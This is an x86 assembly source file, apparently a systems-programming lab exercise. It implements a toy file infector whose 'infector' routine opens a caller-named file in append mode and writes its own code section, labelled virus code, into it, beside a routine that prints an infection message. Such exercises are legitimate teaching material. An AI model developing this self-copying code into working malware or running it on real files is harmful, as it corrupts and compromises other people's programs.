section .data
    msg db 'Hello, Infected File', 10   ; Message with newline
    msg_len equ $ - msg                 ; Length of message

section .text
    global _start
    global system_call
    global code_start
    global code_end
    global infection
    global infector
    extern main

code_start:
infection:
    push ebp
    mov ebp, esp

    ; Print infection message using single syscall
    mov eax, 4              ; sys_write
    mov ebx, 1              ; stdout
    mov ecx, msg            ; message
    mov edx, msg_len        ; length
    int 0x80

    mov esp, ebp
    pop ebp
    ret

infector:
    push ebp
    mov ebp, esp
    
    ; Open file for append
    mov eax, 5              ; sys_open
    mov ebx, [ebp+8]        ; filename from parameter
    mov ecx, 0x441          ; O_WRONLY | O_APPEND
    mov edx, 0644o          ; mode
    int 0x80
    
    ; Check if open failed
    cmp eax, 0
    jl infection_failed
    mov ebx, eax            ; save fd for writing
    
    ; Write the executable code section
    push ebx                ; save fd
    mov eax, 4              ; sys_write
    ; ebx already has fd
    mov ecx, code_start     ; pointer to start of virus code
    mov edx, code_end - code_start  ; length of virus code section
    int 0x80
    
    pop ebx                 ; restore fd
    
    ; Close file
    mov eax, 6              ; sys_close
    int 0x80
    
    mov eax, 1             ; Return success
    jmp done_infector
        
infection_failed:
    mov eax, 0             ; Return failure
    
done_infector:
    mov esp, ebp
    pop ebp
    ret

code_end:
    nop                     ; Ensure code_end has its own address

_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2      ; compute the size of argv in bytes
    add     eax,esi    ; add the size to the address of argv 
    add     eax,4      ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller